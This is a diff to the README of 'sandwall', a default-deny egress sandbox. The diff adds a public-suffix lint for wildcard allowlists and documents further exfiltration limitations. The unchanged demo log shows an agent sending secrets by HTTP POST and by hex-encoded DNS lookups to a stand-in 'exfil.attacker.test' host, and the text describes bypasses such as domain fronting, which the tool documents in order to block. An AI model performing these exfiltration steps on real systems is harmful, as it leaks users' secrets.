@@ -26,7 +26,7 @@ agent: HTTP POST http://10.99.0.1:8080/collect -> 200 'received'
 agent: DNS lookup of 4f50454e41495f4150...exfil.attacker.test -> 10.99.0.1
 => secrets exfiltrated
 
-== (b) sandwall sandbox: default deny, allowlist 4 domains
+== (b) sandwall sandbox: default deny, allowlist 5 domains
 agent: HTTP POST http://10.99.0.1:8080/collect failed: <urlopen error timed out>
 agent: DNS lookup of 4f50454e41495f4150...exfil.attacker.test failed: [Errno -3] Temporary failure in name resolution
 => nothing left the sandbox
@@ -135,9 +135,10 @@ egress:
   default: deny                  # the only supported value
   allow_domains:
     - pypi.org                   # exactly this name
-    - "*.githubusercontent.com"  # any subdomain, not the apex itself
+    - "*.pythonhosted.org"       # any subdomain, not the apex itself
   allow_cidrs:                   # escape hatch for literal IPv4 addresses or ranges
     - 203.0.113.0/24
+  allow_multitenant: []          # acknowledged wildcards over shared hosting (see below)
 limits:
   max_egress_bw: 50mbit          # sandbox -> world; bit, kbit, mbit, gbit; omit for no limit
   max_ingress_bw: 200mbit        # world -> sandbox
@@ -157,6 +158,22 @@ quarantine:                      # optional: quarantine automatically (see Quara
 ```
 
 Unknown keys are rejected, so a typo fails loudly instead of silently allowing nothing or everything.
+
+### Wildcards over shared hosting
+
+A wildcard such as `*.vercel.app`, `*.github.io`, `*.herokuapp.com` or `*.amazonaws.com` matches sites that anyone can set up, so a sandbox allowed one can reach an endpoint its attacker controls, and the SNI/Host check passes because the name really is allowlisted.
+`sandbox create`, `vm clone` and `policy apply` therefore reject any wildcard that covers a public suffix from the [Public Suffix List](https://publicsuffix.org) (its ICANN section, such as `co.uk`, and its private section of hosting platforms), unless the policy acknowledges it:
+
+```yaml
+egress:
+  allow_domains: ["*.vercel.app"]
+  allow_multitenant: ["*.vercel.app"]   # allows nothing by itself; must repeat an allow_domains entry
+```
+
+`sandwall policy lint policy.yaml` runs the same check offline.
+Prefer exact names (`my-app.vercel.app`) or a wildcard under one tenant (`*.my-app.vercel.app`).
+The list is embedded in the binary; `make psl-update` refreshes it.
+A policy already stored when the list changes keeps loading, with a warning in the daemon log.
 `policy apply` re-renders the sandbox's chain and repopulates its allow set atomically, updates tc and Firecracker limits, and leaves established connections alone.
 
 Rule order for traffic leaving the host:
@@ -261,6 +278,7 @@ Prometheus metrics on `:9464/metrics`, all labeled `sandbox`:
 
 - **Shared CDN addresses.** If a non-allowlisted domain is served from the same IP as an allowlisted one, the SNI/Host check stops TLS and HTTP to it on ports 80 and 443 (any port behind an upstream proxy). Other ports, `no_proxy` destinations and `--sni-check=false` leave it reachable by IP until that address's set entry expires (at most 300s after the last allowlisted lookup).
 - **Domain fronting.** Without TLS interception, the HTTP `Host` inside TLS is invisible, so a CDN that routes by that header can be reached through an allowlisted SNI. TLS Encrypted Client Hello would hide the SNI too; sandwall suppresses the HTTPS/SVCB records that carry ECH configs, and a client without them sends a cleartext SNI.
+- **Shared platforms behind exact names.** The wildcard lint cannot help with exact names that serve many users' content, such as `raw.githubusercontent.com` or `gist.github.com`; allowlisting them lets the sandbox fetch anything hosted there.
 - **Allowlisted names are an exfiltration channel if their owner is hostile.** A wildcard such as `*.example.com` lets the sandbox query any subdomain, and those queries do reach `example.com`'s nameservers. Only allowlist zones you trust.
 - **Connection-limit recovery is lazy.** The kernel's `ct count` prunes closed and rejected connections only when new ones are attempted. Right after a burst, the limit can be stricter than configured for a few seconds. It never lets more connections through.
 - **No IPv6.** It is disabled inside sandboxes. AAAA, HTTPS and SVCB queries get empty answers, so clients fall back to IPv4.
@@ -290,3 +308,4 @@ On nested-virtualization hosts, such as a Lima VM on Apple silicon, start many V
 
 Copyright 2026 Andrey Vasilevsky.
 Licensed under the [Apache License, Version 2.0](LICENSE).
+The embedded Public Suffix List (`internal/policy/psl/public_suffix_list.dat`) is from [publicsuffix.org](https://publicsuffix.org) and is subject to the Mozilla Public License 2.0, as stated in its header.
